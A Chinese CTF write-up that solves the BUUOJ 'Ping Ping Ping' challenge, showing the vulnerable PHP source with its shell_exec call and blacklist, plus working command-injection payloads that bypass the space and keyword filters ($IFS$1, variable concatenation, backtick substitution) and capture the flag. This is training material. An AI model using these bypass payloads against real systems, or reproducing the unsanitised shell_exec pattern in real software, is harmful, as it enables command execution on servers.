# Ping Ping Ping

[题目地址](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

为什么现在一看到ping就联想到命令注入？

我的基础确实不行。来到网站，提示输入get参数ip的值。用常用的符号注入一下。

- http://a5766383-106c-4a74-b321-808c0942c11f.node4.buuoj.cn:81/?ip=1.1.1.1|ls

```
/?ip=
flag.php
index.php
```

cat一下就完事了吗？

- http://a5766383-106c-4a74-b321-808c0942c11f.node4.buuoj.cn:81/?ip=1.1.1.1|cat%20flag.php
    > /?ip= fxck your space!

不给用空格。搜了个[绕过方式](https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/)总结，可以用IFS系列绕过。因为{}被过滤了，只能用这种：

- http://a5766383-106c-4a74-b321-808c0942c11f.node4.buuoj.cn:81/?ip=1.1.1.1|cat$IFS$1flag.php
  > /?ip= fxck your flag!

flag也不能用。不能用引号绕过，引号被过滤了，反引号没有被过滤但是也没法绕过。那我先不看了，看index.php有啥总行了吧？

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}
?>
```

绕过的方法在上面的绕过总结里有提到，直接设置shell变量拼接就行了。

- http://a5766383-106c-4a74-b321-808c0942c11f.node4.buuoj.cn:81/?ip=1.1.1.1;a=g;cat$IFS$1fla$a.php
  
```php
/?ip=
<pre>PING 1.1.1.1 (1.1.1.1): 56 data bytes
<?php
$flag = "flag{ca8595ab-a775-49e3-8195-ca2cd2f0c7c3}";
?>
```

注意要检查网页源代码才看得到flag。这种最好理解，官方的wp是用base64，上面的总结里还是有。或者用cat利用反引号输出ls的内容。

- http://a5766383-106c-4a74-b321-808c0942c11f.node4.buuoj.cn:81/?ip=1.1.1.1;a=g;cat$IFS$1`ls`

```php
/?ip=
<pre>PING 1.1.1.1 (1.1.1.1): 56 data bytes
<?php
$flag = "flag{ca8595ab-a775-49e3-8195-ca2cd2f0c7c3}";
?>
/?ip=
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}
?>
```

反引号包裹的字符串会被当作命令执行。做个实验。

```bash
mkdir test
cd test
echo 'a' > test.txt
cat ls
cat `ls`
```

第一个cat报错，因为没有叫ls的文件；然而第二个cat会输出test.txt的文件内容。这是因为ls返回当前目录的文件名，cat根据文件名输出内容。这个命令可以输出当前目录下所有文件的内容。

### Flag
- flag{ca8595ab-a775-49e3-8195-ca2cd2f0c7c3}